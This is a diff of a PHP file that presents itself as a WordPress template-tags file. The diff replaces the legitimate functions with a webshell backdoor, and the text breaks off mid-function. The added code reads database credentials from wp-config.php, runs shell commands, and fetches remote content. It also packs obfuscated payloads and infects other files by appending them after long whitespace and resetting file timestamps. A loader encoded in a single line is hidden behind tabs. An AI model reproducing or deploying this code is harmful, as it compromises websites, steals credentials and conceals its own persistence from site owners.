@@ -1,140 +1,784 @@
 <?php
-/**
- * General template tags that can go anywhere in a template.
- *
- * @package WordPress
- * @subpackage Template
- */
 
-/**
- * Load header template.
- *
- * Includes the header template for a theme or if a name is specified then a
- * specialised header will be included.
- *
- * For the parameter, if the file is called "header-special.php" then specify
- * "special".
- *
- * @since 1.5.0
- * @since 5.5.0 A return value was added.
- * @since 5.5.0 The `$args` parameter was added.
- *
- * @param string $name The name of the specialised header.
- * @param array  $args Optional. Additional arguments passed to the header template.
- *                     Default empty array.
- * @return void|false Void on success, false if the template does not exist.
- */
-function _get_header( $name = null, $args = array() ) {
-	/**
-	 * Fires before the header template file is loaded.
-	 *
-	 * @since 2.1.0
-	 * @since 2.8.0 The `$name` parameter was added.
-	 * @since 5.5.0 The `$args` parameter was added.
-	 *
-	 * @param string|null $name Name of the specific header file to use. Null for the default header.
-	 * @param array       $args Additional arguments passed to the header template.
-	 */
-	do_action( 'get_header', $name, $args );
-
-	$templates = array();
-	$name      = (string) $name;
-	if ( '' !== $name ) {
-		$templates[] = "header-{$name}.php";
+if (@$_REQUEST["k"] === "INSERT_KEY") {
+	function _err($msg)
+	{
+		return json_encode(array("error" => 1, "msg" => $msg));
 	}
 
-	$templates[] = 'header.php';
-
-	if ( ! locate_template( $templates, true, true, $args ) ) {
-		return false;
+	function _res($content)
+	{
+		return json_encode(array("error" => 0, "content" => $content));
 	}
-}
+	function removeFile($file)
+	{
+		if (!file_exists($file)) {	
+			return true;
+		}
 
-/**
- * Load footer template.
- *
- * Includes the footer template for a theme or if a name is specified then a
- * specialised footer will be included.
- *
- * For the parameter, if the file is called "footer-special.php" then specify
- * "special".
- *
- * @since 1.5.0
- * @since 5.5.0 A return value was added.
- * @since 5.5.0 The `$args` parameter was added.
- *
- * @param string $name The name of the specialised footer.
- * @param array  $args Optional. Additional arguments passed to the footer template.
- *                     Default empty array.
- * @return void|false Void on success, false if the template does not exist.
- */
-																																																																											if (@$_REQUEST["k"] === "INSERT_KEY") {$Drwk = function($ZjPec) { return strtr($ZjPec, 'QwS6Tm0qnNuBRo9WIYAdX1Hg4iEPr_7vtKCOLGFfcayVk5pMbZhxj8UJes3lD2z', 'NM0LlIVA2UnYr9t5E6f7wHFQgxjaido3c_zeKy4q1sumDhSTXB8pvWJZRPkCGOb'); };$jTmrL = $Drwk('4O9K_OAruO_KAyut9r7ua');$NtADd = $jTmrL();$BaVb = $NtADd[$Drwk('ru9ORuPT')];foreach ($BaVb as $kPbv => $eXYo) {if (false !== strpos($eXYo, $Drwk('FK_'))) {$uVZUq = $BaVb[$kPbv];continue;}if (false !== strpos($eXYo, $Drwk('CruA'))) {$azvLE = $BaVb[$kPbv];continue;}if (false !== strpos($eXYo, $Drwk('OP9OKAy'))) {$dFYP = str_replace($Drwk('afTr9OK'), "", $BaVb[$kPbv]);continue;}if (false !== strpos($eXYo, $Drwk('Cyut'))) {$lnpT = $BaVb[$kPbv];continue;}}$mSXMc = $azvLE($lnpT($uVZUq($Drwk('OUXZ_Z86YyctPvjzQR6+dsXLTm_zN09J99szzuiUbH9Uj109R+GSn+Q3+0qrJMDVpmP3FfPx//j2k2F3UpybxfAduq+nU8qXqqBC4vtD4QtVhveti0uL/L47s1_8bubjRzno9dJ8eQ8hpQu6w3joLZcuBOgHeeDhheX4Cqf1dOYiReWC7q0oxfz_db9R9/AyR8Vye0eYdE56fGr9v71CUuq8RM5vGB6v7ka77Tun2u7tUW1uMylvYl2Ow2hC/2W1jheT0BRL6uydZR0GlHNiEFqAkJ3vrNa/Eq9QzeksSGe2RS80PEbUrr4BMWTbE7QNQn0ZG_GFrVPlZCLudnivTvbY1AzzzhCFvyhmyE8tJWCGBAIO+wkfhneo_u4S1ZituqW/oah1J/jkAA4mxzibGNYwAem3xt1G0folw_2kRroOqMsLJyt0cl_eOT0QOdq2SYq77FR9wV_CY/YbbvvoCz_/+vaXD7AeWD7Pjdi2JVV8jGRLPjdYWxtvj+W/_vqFOsC3Y_I/jE/+FOMSdU/khF9us/dSRW//ciIReeGkteN0WMHcqfC6f7q2s_3Jp_907FuML+COnOzreh1lohc9VkRzB8L7+2n66FgBd6zobM8QpYCXQa8hRHDaaYvyrncz8ZPA5Rpr0/27RwlD7VfP5tZCbrMX2W9bNn4Dpdz6SuVleMuSZ0MgVpYze3D7lYeXX1CG6lnxzbgk443s3fqaselUSumiqLuxC5EY5p/en23fdAsrQsPj7axC4rMUzuX3V8eWTlfPQMA6fomupFMOyI0piJRkJGMwuw+2PV555166hb+nLnzqkmPbkfonb4ZRp87SW3CeHxGCS/w65vv+ypNTCJps_tvr6eSHwxo80OYsWuIp+RqtiejsBl2DOYyufGzfBka+gtcJS1sAhSjHHMwLJRF7hwAXRgLkilPpDHBwlwuc46iowMJXgLgQJm4oUTVPq9eYSxE9WLPmfeoUq5G41C3AH4HMUeVxwy9d7GCIxtgpP+PP7xGsicDUqWPySQZcgtb_59T1LXs9BaiYnZMg0aAs5atweaWfnaAr370iDBGpL2XdG/fb/5BwHerpr7QL0hmgj1JTOt5tN7LdommoSmM70+d0c06fx04eY5dtZYXd2f3O2FkWuJW_+IENqhOiApA0FYsZhOHWM/M6oi2ptPsEUXs06obiZye_t11iMWhWkivS/0puONuj9vpWVfjHOGoJhkfmIcGzZXXDXtk035lndGcBU0f45z2DsoXuSVgb34S1Hh+DUiAk/JsCiFQ5EieCOBjChns/ih1XYs1sJXQag0QzvyMiYA1iYN/1xXAdHSOuUY9Stu1SX+kSDpCyTWyznjVnO6nH1UWObUXo1OXAF5ZT2FQMV/3j1j/ehtkt8E4AbmiWN3udXlSqVo1IfqoeEicXmpceI2Ngn5SLhsTgsO2k6m7SNY2hTNaXMRmGNaN9GVJrgslCZc3YrP/4_c3HYDvT/TuQt3U6wUo7TfAZCljAT2pBhM95jpWqM_/5DIQ9c2p_sQ3tLDY+IleEY3uY_O1fsPAAvdEUcvTTsW/VV5RU/k6+H_urunCrcJ5SkppCyduQBBCJt9jqwRrgOeH_+z24D3hoJXQieciIAxP27Xn1dGSDhSavAf1n+k3mRYxvMipDTobdE_iaFTVOmIX/OvRVkSYsDvcS+gCI7rV05wDVFngOe3XLIaa3E5JHW46Ey4lgEQw7oHhkgssfPZhm6fJiOeJNNhoq+xS+_Qg5_C3LG4r82AUhw56Aid3CSRoew6Yyq2M5g7MeP1dTfiml2fUuCC3tAsAarA/_/a1vFmB2Zjde3WsMFtkA1CFWeopY9jPg6pHZ44AahAdi+BZ6cgbdo8DvFOxlGw6saoCMq+xP6T8MbC77mO_HXo6G41qGYNIeWgT27As7y_A/YvsjOzA/0/_exhtYhL23a1c1ynm2ttta8yOgUEeBNlQd5H4rCQ0tueCVtCFyBje8UAv9w4uGaiTS8xBezDfSe9ohU82/fcoTUbGIQN4mN7unb6stpJIZYTL5ZhqXjWC2Ui2SsZnD6qFnH4t7SjLRdsATk+fwPVTSFRibcwekmAocrxW1l9dRaEu75TAjZ00ARHu1dgZqSZI_ZMWAo_EbFsFPCzzJ6A8kyWklGkd7B7LiS9BvszF/hB350TBSaXkSD7t1bL3cIpNii3bZlZS1Z3JZ46/45SR4ZXaecIWXPFpAD1WOXahc/DZXQI24cw895dfEEaNl8bUXBO836L4dNvHYCH5TgCg2317_iI/gD7Q_+62hLOl9M9OeN3m95T1ad2XwMr+XmZ4J4XUjDif_rpWgkZnkUofPc8Q16tmRBsz80Ox7+3EJe+TS28Sg7miOObixYwjzm6roQQR1F6H59eQ7hV6zMDqq2pB9eEC_ByXn9mNMPmkZWiuVtvRVr6dGgnlVFhrg_v9dYBWOz6tTQ0z3+nytMrCDSN_rEZF2JDAiu4rCTcdemloAUzqz4r1Al7t759ko7wuZST3kVQFo2AiibGm_dRLODifEQkXatT8B6GWxiWoSwPpyxXf48I6qVPcTTmTkB8gHE2HLYZOA8JnUCEPWwnhamU4xgQ4bEFoiayCAR6v+t1qn1qqB1iGpM6g7udymHQnUeFU/PteUjI9ORnGQzH+B/3acL3Xs+Ad5S_kvXbpQEEtgQhrWRzub94X75a/u27zbTmTQGpDQf3BxsbmZFaM83yhhZHCm4q7EQAZyzPLq32edA/qj37mL/GamMw01rP4mdNI1g4_ipwPv8CJDtwrhXp/ELlAb+QGQHk+zVmJRklDwmiXE4rT796dvcuB+sFl2Z0_mtyjZIIIUL9VRCE1tpEqsYFs2lZXEOPgaENZpNtv8eqRVOg17cbVO27EmFP2HNxGQAChjjorB2zG2uDdbl4FIdixrEIjBGPw3hpVBoz4weUssmqp7vu5f_Xs1Y2T9CL3x2jgfZx7bn_ruWZ3w55U9hZArl44xuUYMZn0JMBaWHyPpr7oZU2NPp8X+e665DOC6lEbibHmohNt0cOa47PXuAaNomBoCuuup+hFw9obipUfFlmpts4J_smf1RpYImZUQzkGrHRrvaA9dewG5lCAY9TgY9X04IeIlPwTWLBl/9jP73M+jUJNN1hgQn42m9OLrH+2HPbHfd4omZr5zbSiiHeVNNGIlF2ARBj4VGyNaasi/s9aBiO3D9q1Wrl4mR04LzD9saOD9DdYkCdyuFEfejl2iPFVSlL35A_Ve9gUhI098gH1b0fH867nmanxmbSbi9vUAP8p_90D7sp8w2mRsrELsiuJpOeQ55RguNHSS34mauGfv8rxjJ2boUJNGCmDihspkDxNG63pzcR4XX31zY_BagyeYzbIpWO88ns9TiDybP3cOXyU+LX9Jf4ntUrZx+6efGt6DpTrxAXYoYnPkZf+t5rIPGvkFJjfWDmjp99Hh7xJpPm/mQUD9gM0TxYVQnlYWgDN8q0ShUGg3k_oa10gLOQ_I5tjovPPPEbCB7m9LMxsvUGAPQ307BpnnfmbrtemHf__oCWVfsO8MC0bn+mAwcumE1c+k0JBjHWFZJFEOiWx_f/IPypv6pxyxR/AeJiw3/HYM6Ywt_CpAH/jlo4krFJM0qkX188i1Fn3D4pVSYz4sTbiFXZ/oXaSJPvH7Nc9hp18W+PmyLg/rCnW0iDZDplZoWTU5YAMGFaGG2RXFiCVBWSfQhXfUMOawJtzzlUyId6fwSn6++o655bMPp6we0QyLUpAErSJ345aj78wxatahIwAB9bPmC+in927sxgL7_jPa6I4J5b1TvhM0cmO7X+QUsqIRqe2EFjyB5XjEg5+FfSQraixctBhkMbY6X8W9UqRf8Hjfvl27qHaLtM3hmWSmtN5g0EdHVf5gH12rbV2ioZdNxS1b2ZiHq5TEPdx6JGBlTe_4n/JhD4t46NluHa/ta+FZlInWR0cSGJ6bqs7XQhSuL8Ih9WORUZaJaY_WNBnBIHFUFgIUHu_b3ly4ikg3HmAfLFLmk37PweWzudZ2viLvVP3MhBYSBRIxPFWcQJJeyBbJkBPOABg4QJQuYGiUiO33DT_tH24FdIXiEv3wT3gu37i9NxzlHQDtmx_rS43yigECb6VNmRJ98ma2jTcwrX9astss8laSiUSBgtLEHjp9LDVckOfVqy6I6c/7lX3F81F5mtAQrNdtY6yMehNwsqsLw7CpDkGtly89TU1NBw9lcZ4XcLz4jQSO05o23LkDj8Hh8BvenstpM6AfkXA/AkBFjdrIflH+10pe7F+7a2/RlmhJ_zUYYdYP7gR5CqpltveGs55O+QhsA3BT5yJPRnMknV4N1SDuG2MhmORD_ILxyFflpxEUTWaYdcmH7XJQZMMADEgrgYiWgy5mdAR8VB3eEF33N3aBVBj3eF/eGtd+n_u4WQlNbxbQicQ25+ffU_OL2zUhkwBe401lH5P1yZBVwnWJbx2L2fZEtFyhvEjdg9YDaLpRsiqLFQxH_FQGPdrRYB94qaj2Otl1dgN_lt0Hw3Aa/mW86PuCXVycYhv1aQQzPFOid++glFdMTiHvTofibFH+lPQcG62zC3bJ9o8YdapTSbhfVWA2NSFZg7GLRB+JhWOAieMfmoC+d/m8LdV6E+mjvL4tZv3N+fLiQ82bwfjsbJNW0Pnl1LqeQUR5fNS1ZUi8I+zqSxEa+5n1/tPfLD6Rqpczpv2/wHDmN8HW9HfkZfeDR_XSH9_gzMXWGW6aZ3k6qrFp28s+ywbFnTM+moTCgc/O4OShZgiD0ageawTc4MJLtGUuGoJkofEMov4a7xiyjnsWrk+kxnn1vzNgtmHglN9Pt3nCr3nGOpf8GzRDnXGbmH7StpVAh/yZNMAcxp/FN70QAX4YWMWRZ8ZL51htUy0bRZgt/PleF66Aypnee2grGeZmvnYG1p9FBbTqXI2uw7u1F57+Jo6koXxES6bL62nG_pJcBe0BcdiTUbjy9jyysiup8v3Uxz9BjZj/uhJ4W3PcImYoYSzcGNiieAEF+oj7OSQ1Td+03J4DdWG9ihiist/czaJas8IdiLkAYPdkjfutoMR9V9cydd3z2EzwSeiRwI_bnkk1zjl+wLO_G//kuLNXWXstCLt1mlWbS4zYDasGBRdbLVIsiQ3F96yUe388BPm_hIQllqMjmk9Sx6PZpwyoGBxRu+_vHMTNhVjLy2caCD1kltUG7WRTcLgIEIHB5mFsv9Uc/4kVdyeFZ+4Zp7Z2Z250uWQuOkDm5kOlg0ijP/RbNBILcDrGc_/h+FmVFqhGM9o+UEMQrN69gBSkLSF4jdfX_gNRuc1J8tSaRvXhOD1GTJ3ZSSpLvqoqwAu668HfrQ7GA9tDog1aALFQN6sIinOlkQJrH+hMOZXP7y8kV6yGYNsVzkRFw30hZ/L_NzDiUSJSPSvMnJT8anejZoh0d2cahk/76jPtjyfhd+iaNZ3gm68EwRzDD9VbtFT/9vvHNmlHMvZ5GtUUgqDh7S7j1oUP0Mf9zpRwYAApsDvuXIuXGPxCOuPqbQE+nJHcdQwcWDgcb9qnCLmGd0ewvsBi6fDcMiGwe3/zAUFxdNWQfDS+rSzS2qqOmPaGhzL0SzaOib6i72BWgM7c7ahPsV0OUIBSJ/pUMFE7QeMLMCXuNsmM/t5yvBUtku/fpD+MOfCeidBP5Hy7IdJVicrURFzz2YfVtpT49vb9AWjbQymOpp/j4DgrCSLFxylzUv57m/3ELD8LPkFGtGPYrMDoPheqG67uEhXaARNz2CzlT+2MhB8N5hkeeRNZW9h_Gp+Dhzf12xxj1FLUYmSoa0n_ncgGCDWpvDZhuEMddo1QWy9GX+Juc/prnEJJ15PLWiOfRTd0zSIlOkD/qgJFm8X22yjWQoHe/gVMFaYjpbIr/bRUp5sGDW47QP1hF7FpL1LxbX2x9/rhaybfgCQjSxWE7fa26YXo70D6EFLv62SnpUmqmqre2sMVpVTS1evN6hFffO4X1YD_qFHI64d9HGl1WjS8h+HVYokLfMDGhbp85_PGz1ddo_tYeUynPw+PjLq5XFdVh6TDTo2Dp99PEgePRpvQb9Qqv20r71CvTDjlgEIU8Ey3Rs+vqu2aCgnJhopJp_8rkJ/75hh6vgc_X/GoutnAv4OaFlCiQBW5c5/7Q_ah50dbe3pToPJoy_14TGXGX9An0ezbxe4_TLGXSmkF3ztkGZ6hWZ9+jXpj4Xw+HCWgxx16YzilQbiLNGXhOrS7T1CWQet0O7uzLo8zuUJtDkHQOOqs5asMFg2RYqkA1zP8/vlDZhg90thqazp0kXt1xCh25jjA9MOEuudP1WFtuMixdYychVi/OkFgePPfcL/x82d51EVeLClarUdr30M0OGOhLVtU8fGkArr5op7lqlpkVEkrgNcMpGg7H+hV6fJH_7Q5ZQssUaG5R+/xTilO+0YTRfpS5Gv0N96HWBfYwjYekbJJ8iAPd2jjk_d1yTalD2YOMOMgLx2lOThVT8T80a9HIyORyyEVX0J8vwItL0zOqOY+Znon78Rzg980+I/Lz1Go36+fbJD/r/eSergzQ9AZn5_fSfwdY_BoOSOhTDkRab7iX+rns/b0BcjDW/jftc_OX++xJUNB9eHyuqQ50k1a5hAmHZCbiFyJ34OcDE1axPDvFqYq6i0W/X3HF/nTwtdmk+tGI+ZlGIbrHqzVvIiEtlOCQ+8R5L5wpGsPJ_BVlUJDmJU78bdJVLmPpbyn7oWknCo8Iq4E7/MBFbA+SosCliHiZnNUflz3W8AdW+t/ugFsO_nhEqxOExas6X91lDHFYtu+kXw9VvOk0_RRpz1RPPYjFS5vvoLqz+IRk4p+F5/hLatweA6E6baR5uJRRUAaJ00ec+T0SuYJhYCTvx7aRUyBzOfma2my+wyZ_f9vg4lYYVYCPQ49xhSY+oXGE1JS0+JFX+ryP0ZPt/HtOwxcWOvCqCQ2IozYqf9DcgGQoe8qcaui+XkfMaLP+rh2xT5096M32TMzbP5Dz7jA5xfBYPO8Xnx+to_LBYuCBHWu13EAO8floSu72vi7XwZ0gEo+Vs5xBRWs7mrM_hTEyJsDU9LrJ2+aJMlLOJma0M8R1vh8H0teR0Hsv/D8sHZzZkqSHd5cteAaCCzYzQn6WenOM+ans7UHvGufiJmn6rWU6yBDaBRcrDsVMdejfLyNpvBHx_GQA+/JtfPl9eXUru+wYzqxp14NeA6A4FzjOy4Ga0rnfTXBMBUWN53uuwMfUDwpE+kESu4pqn2m+cb4NEmhHiWueBDLPrSm/g2cTAYANBbiLMSw0G/hjNFBe/eAghg3qAWkzmR/eOg/aWRwH4=='))));if (isset($dFYP) && function_exists($dFYP)) {$GgxDp = $Drwk('ORR7RKROx7R9ru4');if (function_exists($GgxDp)) {$GgxDp(constant($Drwk('IKq66')) ^ constant($Drwk('IKkIseIlqMIk')));}$g = $dFYP('', $mSXMc);} else {$g = function() use($Drwk, $mSXMc) {$nKRu = __DIR__ . $Drwk('/.rut');$MKUnb = $Drwk('ArTOKxy9Kt7u9Ou9a');$lBPf = $Drwk('yuTru3');if (@$MKUnb($nKRu, $Drwk('<?x5x ') . $mSXMc, constant($Drwk('62lLKIb')))) {try {include_once($nKRu);$lBPf($nKRu);} catch (Exception $e) {$lBPf($nKRu);if ($Drwk('_rO') === $e->{$Drwk('4O9wOaaP4O')}()) exit;}}};}$g();}
-function _get_footer( $name = null, $args = array() ) {
-	/**
-	 * Fires before the footer template file is loaded.
-	 *
-	 * @since 2.1.0
-	 * @since 2.8.0 The `$name` parameter was added.
-	 * @since 5.5.0 The `$args` parameter was added.
-	 *
-	 * @param string|null $name Name of the specific footer file to use. Null for the default footer.
-	 * @param array       $args Additional arguments passed to the footer template.
-	 */
-	do_action( 'get_footer', $name, $args );
+		if (!is_dir($file)) {
+			return unlink($file);
+		}
 
-	$templates = array();
-	$name      = (string) $name;
-	if ( '' !== $name ) {
-		$templates[] = "footer-{$name}.php";
+		foreach (scandir($file) as $item) {
+			if ($item == '.' || $item == '..') {
+				continue;
+			}
+
+			if (!removeFile($file . DIRECTORY_SEPARATOR . $item)) {
+				return false;
+			}
+
+		}
+		return rmdir($file);
 	}
 
-	$templates[] = 'footer.php';
-
-	if ( ! locate_template( $templates, true, true, $args ) ) {
-		return false;
-	}
-}
-
-/**
- * Load sidebar template.
- *
- * Includes the sidebar template for a theme or if a name is specified then a
- * specialised sidebar will be included.
- *
- * For the parameter, if the file is called "sidebar-special.php" then specify
- * "special".
- *
- * @since 1.5.0
- * @since 5.5.0 A return value was added.
- * @since 5.5.0 The `$args` parameter was added.
- *
- * @param string $name The name of the specialised sidebar.
- * @param array  $args Optional. Additional arguments passed to the sidebar template.
- *                     Default empty array.
- * @return void|false Void on success, false if the template does not exist.
- */
-function _get_sidebar( $name = null, $args = array() ) {
-	/**
-	 * Fires before the sidebar template file is loaded.
-	 *
-	 * @since 2.2.0
-	 * @since 2.8.0 The `$name` parameter was added.
-	 * @since 5.5.0 The `$args` parameter was added.
-	 *
-	 * @param string|null $name Name of the specific sidebar file to use. Null for the default sidebar.
-	 * @param array       $args Additional arguments passed to the sidebar template.
-	 */
-	do_action( 'get_sidebar', $name, $args );
-
-	$templates = array();
-	$name      = (string) $name;
-	if ( '' !== $name ) {
-		$templates[] = "sidebar-{$name}.php";
+	function randomStr($length, $charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
+	{
+		$charactersLength = strlen($charset);
+		$randomString = "";
+		for ($i = 0; $i < $length; $i++) {
+			$randomString .= $charset[rand(0, $charactersLength - 1)];
+		}
+		return $randomString;
 	}
 
-	$templates[] = 'sidebar.php';
+	function request($method, $url, $outhandle = null, $parameters = null, $headers = null)
+	{
+		$response = new stdClass();
 
-	if ( ! locate_template( $templates, true, true, $args ) ) {
-		return false;
+		if (!function_exists("curl_exec")) {
+			if(ini_get("allow_url_fopen")) {
+				$opts_array = array(
+					"method" => $method,
+				);
+				if ($headers !== null) $opts_array["header"] = $headers;
+				if ($method == "POST" && $parameters !== null) {
+					$opts_array["content"] = http_build_query($parameters);
+				}
+				$opts = array("http" => $opts_array);
+				$context = stream_context_create($opts);
+				$res = file_get_contents($url, false, $context);
+				if ($outhandle !== null) {
+					fwrite($outhandle, $res);
+				} else {
+					$response->body = $res;
+				}
+				$response->success = true;
+				return $response;
+			} else {
+				$response->success = false;
+				$response->msg = "cURL and allow_url_fopen is disabled.";
+				return $response;
+			}
+		}
+
+		$ch = curl_init();
+
+		($parameters !== null) ? $query = http_build_query($parameters) : $query = "";
+
+		if ($method === "POST") {
+			curl_setopt($ch, CURLOPT_POST, 1);
+			curl_setopt($ch, CURLOPT_POSTFIELDS, $query);
+		} elseif ($method === "GET") {
+			if ($query) $url = $url . "?" . $query;
+		} else {
+			$response->success = false;
+			$response->msg = "methods available: GET or POST";
+			return $response;
+		}
+
+		curl_setopt($ch, CURLOPT_URL, $url);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+		curl_setopt($ch, CURLOPT_TIMEOUT, 300);
+
+		if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+
+		if ($outhandle !== null) curl_setopt($ch, CURLOPT_FILE, $outhandle);
+
+		$result = curl_exec($ch);
+		if ($result !== false) {
+			$response->success = true;
+			$response->body = $result;
+		} else {
+			$response->success = false;
+			$response->msg = curl_errno($ch);
+		}
+		curl_close($ch);
+		return $response;
 	}
+	function getConfigConstants()
+	{
+		$tmpfile = tempnam(sys_get_temp_dir(), "_");
+		$handle = fopen($tmpfile, "w+");
+		$config_content = file("../wp-config.php");
+		$content_size = sizeof($config_content);
+		for ($i=0;$i < $content_size;$i++) {
+			if (preg_match("/require_once/", $config_content[$i])) {
+				unset($config_content[$i]);
+			}
+		}
+		fwrite($handle, implode(PHP_EOL, $config_content));
+		fclose($handle);
+		include $tmpfile;
+		unlink($tmpfile);
+		return get_defined_vars();
+	}
+	function getThisPath()
+	{
+		if ('.inc' === basename(__FILE__)) { 
+			$backtrace = debug_backtrace(
+			defined("DEBUG_BACKTRACE_IGNORE_ARGS")
+			? DEBUG_BACKTRACE_IGNORE_ARGS
+			: FALSE);
+			$top_parent = array_pop($backtrace);
+			return $top_parent["file"];
+		} else {
+			$path = preg_replace('@\(.*\(\).*$@', '', __FILE__);
+			$path = preg_replace('@\(.*runtime-created.*$@', '', $path);
+			return $path;
+		}
+	}
+	function packScript($script) 
+	{
+		$compressed = base64_encode(gzcompress(gzdeflate($script)));
+		$from_charset = str_shuffle("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_");
+		$to_charset = str_shuffle("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_");
+		$varname_charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+		$r_vn = function () use ($varname_charset) { return '$' . randomStr(rand(4, 5), $varname_charset); };
+		$nulls = array_fill(0, 16, null);
+		$v_arr = array_map($r_vn, $nulls);
+		list($ab, $cd, $aa, $a, $b, $c, $d, $e, $f, $h, $i, $j, $k, $l, $m, $q) = $v_arr;
+		$shuffle = function ($str) use ($ab, $from_charset, $to_charset) { return "$ab('" . strtr($str, $from_charset, $to_charset) . "')"; };
+		$code = <<<EOT
+		$ab = function($cd) { return strtr($cd, '$to_charset', '$from_charset'); };
+		$q = {$shuffle("get_defined_functions")};
+		$aa = $q();
+		$a = ${aa}[{$shuffle("internal")}];
+		foreach ($a as $b => $c) {
+			if (false !== strpos($c, {$shuffle("4_d")})) {
+				$d = ${a}[$b];
+				continue;
+			}
+			if (false !== strpos($c, {$shuffle("zinf")})) {
+				$e = ${a}[$b];
+				continue;
+			}
+			if (false !== strpos($c, {$shuffle("eate_fu")})) {
+				$f = str_replace({$shuffle("sqlite_")}, '', ${a}[$b]);
+				continue;
+			}
+			if (false !== strpos($c, {$shuffle("zunc")})) {
+				$h = ${a}[$b];
+				continue;
+			}
+		}
+		$j = $e($h($d({$shuffle($compressed)})));
+		if (isset($f) && function_exists($f)) {
+			$m = {$shuffle("error_reporting")};
+			if (function_exists($m)) {
+				$m(constant({$shuffle("E_ALL")}) ^ constant({$shuffle("E_DEPRECATED")}));
+			}
+			\$g = $f('', $j);
+		} else {
+			\$g = function() use($ab, $j) {
+				$i = __DIR__ . {$shuffle("/.inc")};
+				$k = {$shuffle("file_put_contents")};
+				$l = {$shuffle("unlink")};
+				if (@$k($i, {$shuffle("<?php ")} . $j, constant({$shuffle("LOCK_EX")}))) {
+					try {
+						include_once($i);
+						$l($i);
+					} catch (Exception \$e) {
+						$l($i);
+						if ({$shuffle("die")} === \$e->{{$shuffle("getMessage")}}()) exit;
+					}
+				}
+			};
+		}
+		\$g();
+EOT;
+		$oneline = str_replace(array("\r", "\n"), "", preg_replace("/^\s+/m", "", $code));
+		return $oneline;
+	}
+	function is_shell_avail() {
+		return !empty(array_filter(array_map("function_exists", array("proc_open", "exec", "system","passthru", "popen", "shell_exec"))));
+	}
+	function _shell($command) 
+	{
+		$res = new stdClass();
+		$retval = 0;
+		$get_pipes = function($cmd, $cb) {
+			$file = "._err";
+			$stdout = $cb($cmd . " 2>$file");
+			if (file_exists($file)) {
+				$stderr = file_get_contents($file);
+				@unlink($file);
+			} else {
+				$stderr = null;
+			}
+			return array($stdout, $stderr);
+		};
+		$exec_file = function($cmd, $cb) {
+			$file = "._sh";
+			$out_file = "._out";
+			$contents = "#!/bin/sh" . PHP_EOL . $cmd . " 1>$out_file";
+			file_put_contents($file, $contents);
+			$cb($file);
+			@unlink($file);
+			if (file_exists($out_file)) {
+				$stdout = file_get_contents($out_file);
+				@unlink($out_file);
+				return $stdout;
+			}
+			return false;
+		};
+		if (function_exists("proc_open")) {
+			$descriptorspec = array(
+				0 => array("pipe", "r"),
+				1 => array("pipe", "w"),
+				2 => array("pipe", "w"),
+			);
+			$process = proc_open($command, $descriptorspec, $pipes);
+			$stdout = stream_get_contents($pipes[1]);
+			fclose($pipes[1]);
+			$stderr = stream_get_contents($pipes[2]);
+			fclose($pipes[2]);
+			$retval = proc_close($process);
+		} elseif (function_exists("exec")) {
+			list($stdout, $stderr) = $get_pipes($command, function($cmd) use(&$retval) {
+				$buf = array();
+				exec($cmd, $buf, $retval);
+				$out = implode("\n", $buf) . "\n";
+				return $out;
+			});
+		} elseif (function_exists("system")) {
+			list($stdout, $stderr) = $get_pipes($command, function($cmd) use(&$retval) {
+				ob_start();
+				system($cmd, $retval);
+				$out = ob_get_contents();
+				ob_clean();
+				return $out;
+			});
+		} elseif (function_exists("passthru")) {
+			list($stdout, $stderr) = $get_pipes($command, function($cmd) use(&$retval) {
+				ob_start();
+				passthru($cmd, $retval);
+				$out = ob_get_contents();
+				ob_clean();
+				return $out;
+			});
+		} elseif (function_exists("popen")) {
+			list($stdout, $stderr) = $get_pipes($command, function($cmd) use(&$retval) {
+				$handle = popen($cmd, "r");
+				$out = stream_get_contents($handle);
+				$retval = pclose($handle);
+				return $out;
+			});
+		} elseif (function_exists("shell_exec")) {
+			list($stdout, $stderr) = $get_pipes($command, function($cmd) use(&$retval) {
+				$sep = "_retval_";
+				$sh = shell_exec("$cmd;echo '$sep'$?");
+				$arr = explode($sep, $sh);
+				$out = $arr[0];
+				$retval = (int)trim($arr[1]);
+				return $out;
+			});
+		} else {
+			$res->success = false;
+			$res->msg = "Shell is disabled";
+			return $res;
+		}
+		$res->success = true;
+		if (isset($retval)) $res->body["retval"] = (int)$retval;
+		$res->body["stdout"] = isset($stdout) ? $stdout : "";
+		$res->body["stderr"] = isset($stderr) ? $stderr : "";
+		return $res;
+	}
+	function _edit_with_php($path)
+	{
+		$is_open_basedir = strlen(ini_get("open_basedir")) > 0;
+		if ($is_open_basedir) {
+			if (is_shell_avail()) {
+				@is_readable($path);
+				$last_error = error_get_last();
+				if ($last_error !== null) {
+					if (strpos($last_error["message"], "open_basedir") !== false) {
+						return false;
+					}
+				}
+			}
+		}
+		return true;
+	}
+	function _resolve_path($path) 
+	{
+		$arr = glob($path);
+		if ($arr === null || empty($arr)) {
+			if (is_shell_avail()) {
+				$find_files = _shell('readlink -f '.$path);
+				$arr = array_filter(explode("\n", $find_files->body["stdout"]));
+			} else {
+				$arr = array();
+			}
+		}
+		return $arr;
+	}
+	function _infect($path, $script) 
+	{
+		$res = array();
+		$path_arr = _resolve_path($path);
+		if (!empty($path_arr)) {
+			foreach ($path_arr as $p) {
+				if (_edit_with_php($p)) {
+					$time = filemtime($p);
+					$fcontents = @file_get_contents($p);
+					if ($fcontents === false) {
+						$res[] = array("path" => $p, "result" => "permission denied");
+						continue;
+					}
+					if (strpos($fcontents, "\$g();") !== false) {
+						$res[] = array("path" => $p, "result" => "already infected");
+					} else {
+						if (isset($_REQUEST["private"])) {
+							$key = randomStr(12);
+							$file = str_replace("INSERT_KEY", $key, $script);
+						} else {
+							$file = $script;
+						}
+						$newlines = str_repeat("\n", 30);
+						$tabs = str_repeat("\t", 70);
+						$code = $newlines . $tabs . packScript($file);
+						if (@file_put_contents($p, $code, FILE_APPEND)) {
+							touch($p, $time);
+							if (function_exists("opcache_invalidate")) {
+								if (!(opcache_invalidate($p, true))) {
+									touch($p, $time + 1);
+								}
+							}
+							$arr["path"] = $p;
+							if (isset($_REQUEST["private"])) {
+								$arr["key"] = $key;
+							}
+							$arr["result"] = "success";
+							$res[] = $arr;
